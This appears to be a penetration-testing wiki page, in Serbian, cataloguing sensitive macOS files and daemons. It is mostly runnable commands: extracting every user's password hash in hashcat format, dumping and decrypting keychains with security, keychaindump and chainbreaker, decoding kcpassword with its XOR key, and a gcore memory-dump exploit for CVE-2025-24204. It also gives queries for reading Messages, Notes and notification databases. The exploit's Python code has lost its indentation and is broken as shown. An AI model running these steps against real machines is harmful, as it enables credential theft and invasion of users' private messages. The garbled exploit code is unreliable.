# macOS Osetljive lokacije i zanimljivi demoni

{{#include ../../../banners/hacktricks-training.md}}

## Lozinke

### Shadow lozinke

Shadow password se čuva zajedno sa konfiguracijom korisnika u plist fajlovima koji se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može da se koristi za ispis **svih informacija o korisnicima** (uključujući informacije o hash-ovima):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za pretvaranje hash-a u **hashcat** **format**.

Alternativna jednolinijska naredba koja će ispisati kredencijale svih naloga koji nisu servisni u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Još jedan način da se dobije `ShadowHashData` korisnika je korišćenjem `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ovaj fajl se **koristi samo** kada sistem radi u **single-user mode** (dakle ne često).

### Keychain Dump

Imajte na umu da pri korišćenju security binary da biste **dump the passwords decrypted**, pojaviće se više upita koji traže od korisnika da dozvoli ovu operaciju.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Na osnovu ovog komentara [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) izgleda da ovi alati više ne rade na Big Sur.

### Keychaindump Pregled

Alat nazvan **keychaindump** razvijen je za izvlačenje lozinki iz macOS keychain-ova, ali nailazi na ograničenja na novijim verzijama macOS-a kao što je Big Sur, kako je navedeno u [raspravi](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump** zahteva da napadač dobije pristup i poveća privilegije na **root**. Alat iskorišćava činjenicu da je keychain po defaultu otključan prilikom prijave korisnika radi praktičnosti, što aplikacijama omogućava pristup bez ponovnog traženja korisnikove lozinke. Međutim, ako korisnik odluči da zaključava svoj keychain posle svake upotrebe, **keychaindump** postaje neefikasan.

**Keychaindump** radi tako što cilja specifičan proces zvan **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-a. Proces ekstrakcije uključuje identifikaciju **Master Key** koji je izveden iz korisnikove lozinke za prijavu. Ovaj ključ je neophodan za čitanje keychain fajla. Da bi pronašao **Master Key**, **keychaindump** pretražuje memorijski heap procesa **securityd** koristeći komandu `vmmap`, tražeći potencijalne ključeve unutar oblasti označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za pregled ovih memorijskih lokacija:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heaps u potrazi za specifičnim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Dalji koraci, uključujući deobfuscation, potrebni su da bi se taj ključ iskoristio, kako je opisano u izvornom kodu **keychaindump**-a. Analitičari koji se fokusiraju na ovu oblast treba da imaju u vidu da su ključni podaci za dešifrovanje keychain-a smešteni u memoriji procesa **securityd**. Primer komande za pokretanje **keychaindump** je:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da se koristi za ekstrakciju sledećih tipova informacija iz OSX keychain-a na forenzički ispravan način:

- Hashovana Keychain lozinka, pogodna za razbijanje pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
- Internet lozinke
- Generičke lozinke
- Privatni ključevi
- Javni ključevi
- X509 sertifikati
- Sigurne beleške
- Appleshare lozinke

Ako su dostupni lozinka za otključavanje Keychain-a, master ključ dobijen korišćenjem [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili datoteka za otključavanje kao što je SystemKey, Chainbreaker će takođe izvući lozinke u prostom tekstu.

Bez jedne od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.

#### **Izdvajanje ključeva iz Keychain-a**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Izvuci keychain ključeve (sa lozinkama) pomoću SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Izdvojite keychain ključeve (sa lozinkama) pomoću memory dump-a**

[Pratite ove korake](../index.html#dumping-memory-with-osxpmem) da biste izvršili **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) koristeći lozinku korisnika**

Ako znate lozinku korisnika, možete je iskoristiti da **dump and decrypt keychains that belong to the user**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) je isporučio `/usr/bin/gcore` sa **`com.apple.system-task-ports.read`** entitlement-om, pa bilo koji lokalni admin (ili zlonamerna potpisana aplikacija) može dump-ovati **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear i omogućava dešifrovanje `login.keychain-db` bez korisničke lozinke.

**Brza reprodukcija na ranjivim buildovima (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

Fajl **kcpassword** sadrži **korisničku lozinku za prijavu**, ali samo ako vlasnik sistema ima **omogućeno automatsko prijavljivanje**. Stoga će korisnik biti automatski prijavljen bez traženja lozinke (što nije bezbedno).

Lozinka se čuva u fajlu **`/etc/kcpassword`** xored sa ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je korisnikova lozinka duža od ključa, ključ će se ponavljati.\
Ovo čini lozinku prilično lakom za otkrivanje, na primer korišćenjem skripti poput [**ove**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Zanimljive informacije u bazama podataka

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifikacije

Podatke o notifikacijama možete pronaći u `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Većina interesantnih informacija biće u **blob**. Dakle moraćete da **izvučete** taj sadržaj i **pretvorite** ga u **čitljiv** **oblik** ili da koristite **`strings`**. Da biste mu pristupili, možete uraditi:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Nedavni problemi sa privatnošću (NotificationCenter DB)

- U macOS **14.7–15.1** Apple je čuvao sadržaj banera u `db2/db` SQLite bez adekvatnog redigovanja. CVE-ovi **CVE-2024-44292/44293/40838/54504** su omogućavali bilo kom lokalnom korisniku da pročita tekst notifikacija drugih korisnika samo otvaranjem DB (no TCC prompt). Ispravljeno u **15.2** pomeranjem/zaključavanjem DB; na starijim sistemima navedena putanja i dalje leaks nedavne notifikacije i priloge.
- Baza podataka je čitljiva svima samo na pogođenim buildovima, pa prilikom istrage na nasleđenim endpointima kopirajte datoteku pre nadogradnje da sačuvate artefakte.

### Napomene

Korisničke **beleške** se mogu naći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Postavke

U macOS aplikacijama postavke se nalaze u **`$HOME/Library/Preferences`** i na iOS-u su u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

U macOS-u CLI alat **`defaults`** može da se koristi za **izmenu Preferences fajla**.

**`/usr/sbin/cfprefsd`** preuzima XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može biti pozvan da izvrši radnje kao što je izmena postavki.

## OpenDirectory permissions.plist

Fajl `/System/Library/OpenDirectory/permissions.plist` sadrži dozvole primenjene na atribute nodova i zaštićen je SIP.\
Ovaj fajl dodeljuje dozvole određenim korisnicima po UUID-u (a ne po uid) tako da oni mogu pristupiti određenim osetljivim informacijama kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, između ostalog:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Sistemske notifikacije

### Darwin notifikacije

Glavni daemon za notifikacije je **`/usr/sbin/notifyd`**. Da bi primili notifikacije, klijenti moraju da se registruju preko Mach porta `com.apple.system.notification_center` (proverite ih pomoću `sudo lsmp -p <pid notifyd>`). Daemon se može konfigurisati fajlom `/etc/notify.conf`.

Imena koja se koriste za notifikacije su jedinstvene reverse DNS notacije i kada se notifikacija pošalje jednom od njih, klijent(i) koji su prijavili da je mogu obraditi će je primiti.

Moguće je ispisati trenutni status (i videti sva imena) slanjem signala SIGUSR2 procesu notifyd i čitanjem generisanog fajla: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distribuirani centar za obaveštavanja

Distribuirani centar za obaveštavanja, čiji je glavni binarni fajl **`/usr/sbin/distnoted`**, predstavlja još jedan način za slanje notifikacija. Izlaže neke XPC servise i vrši određene provere u pokušaju da verifikuje klijente.

### Apple Push Notifications (APN)

U ovom slučaju, aplikacije mogu da se registruju za **teme**. Klijent će generisati token kontaktirajući Apple-ove servere putem **`apsd`**.\
Zatim će i provajderi takođe generisati token i moći će da se povežu sa Apple-ovim serverima da šalju poruke klijentima. Te poruke će lokalno primati **`apsd`**, koji će preusmeriti notifikaciju aplikaciji koja je očekuje.

Preferencije se nalaze u /Library/Preferences/com.apple.apsd.plist.

Postoji lokalna baza podataka poruka koja se nalazi na macOS-u u /Library/Application\ Support/ApplePushService/aps.db i na iOS-u u /var/mobile/Library/ApplePushService. Ima 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Takođe je moguće dobiti informacije o daemonu i konekcijama koristeći:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Korisnička obaveštenja

Ovo su obaveštenja koja bi korisnik trebao da vidi na ekranu:

- **`CFUserNotification`**: Ovi API-ji omogućavaju prikaz iskačućeg prozora sa porukom na ekranu.
- **The Bulletin Board**: Ovo prikazuje na iOS-u baner koji nestaje i biće sačuvan u Notification Center-u.
- **`NSUserNotificationCenter`**: Ovo je iOS bulletin board na MacOS-u. Baza podataka sa notifikacijama se nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Reference

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
